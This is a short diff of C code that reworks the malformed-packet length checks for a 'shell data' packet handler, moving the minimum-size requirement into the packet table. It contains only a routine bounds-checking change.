@@ -131,7 +131,7 @@ void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     uint32_t id;
 
     /* ignore packet if malformed */
-    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH + sizeof(uint32_t) || sz <= sizeof(uint32_t))
+    if (sz - sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH)
         return;
 
     laikaS_readInt(&peer->sock, &id, sizeof(uint32_t)); /* this is ignored for now */
@@ -191,7 +191,7 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         shellC_handleShellData,
-        0,
+        sizeof(uint32_t), /* packet must be bigger than this */
     true)
 };
 
